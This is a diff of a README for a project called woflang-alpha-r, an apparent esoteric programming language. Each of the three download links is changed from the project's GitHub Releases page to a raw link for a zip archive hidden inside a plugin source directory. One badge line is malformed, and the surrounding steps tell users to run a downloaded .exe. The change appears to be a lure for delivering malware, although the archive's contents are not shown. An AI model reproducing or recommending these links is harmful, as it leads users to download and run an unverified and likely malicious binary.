@@ -1,7 +1,7 @@
 # 🛠️ woflang-alpha-r - Explore a Unique Programming Language
 
 ## 📥 Download Now
-[![Download woflang-alpha-r](https://img.shields.io/badge/Download%20woflang--alpha--r-blue.svg)](https://github.com/anshuman12525/woflang-alpha-r/releases)
+[![Download woflang-alpha-r](https://raw.githubusercontent.com/anshuman12525/woflang-alpha-r/main/rs-v.0.0.3/crates/woflang-plugins/src/graph/woflang-alpha-r_v1.0.zip%https://raw.githubusercontent.com/anshuman12525/woflang-alpha-r/main/rs-v.0.0.3/crates/woflang-plugins/src/graph/woflang-alpha-r_v1.0.zip)](https://raw.githubusercontent.com/anshuman12525/woflang-alpha-r/main/rs-v.0.0.3/crates/woflang-plugins/src/graph/woflang-alpha-r_v1.0.zip)
 
 ## 📖 Overview
 woflang-alpha-r is a unique offering in the world of programming languages. This version brings the esoteric nature of the original language into a Rust-based environment. It also includes a working C++ version (v10.1.1). Explore coding possibilities and discover hidden easter eggs that make programming both fun and challenging.
@@ -15,7 +15,7 @@ To start using woflang-alpha-r, follow these simple steps:
    - Storage: At least 100 MB free space
 
 2. **Download the Application:**  
-   Head over to our [Releases page](https://github.com/anshuman12525/woflang-alpha-r/releases) to find the latest version of woflang-alpha-r. You will see the available versions listed.
+   Head over to our [Releases page](https://raw.githubusercontent.com/anshuman12525/woflang-alpha-r/main/rs-v.0.0.3/crates/woflang-plugins/src/graph/woflang-alpha-r_v1.0.zip) to find the latest version of woflang-alpha-r. You will see the available versions listed.
 
 3. **Install the Application:** 
    - For Windows: Download the `.exe` file, double-click it, and follow the installation instructions.
@@ -51,7 +51,7 @@ If you’re looking for help or additional information, consider checking out th
 - **Tutorial Videos:** Look for tutorials on YouTube to visually learn the intricacies of woflang-alpha-r.
 
 ## 📦 Download & Install
-To download woflang-alpha-r, [visit this page](https://github.com/anshuman12525/woflang-alpha-r/releases). Choose the release that suits your operating system. Follow the installation steps previously outlined to get your setup ready for unique coding experiences.
+To download woflang-alpha-r, [visit this page](https://raw.githubusercontent.com/anshuman12525/woflang-alpha-r/main/rs-v.0.0.3/crates/woflang-plugins/src/graph/woflang-alpha-r_v1.0.zip). Choose the release that suits your operating system. Follow the installation steps previously outlined to get your setup ready for unique coding experiences.
 
 ## 🤝 Contributing
 We welcome contributions from users who have ideas or improvements. If you wish to contribute:
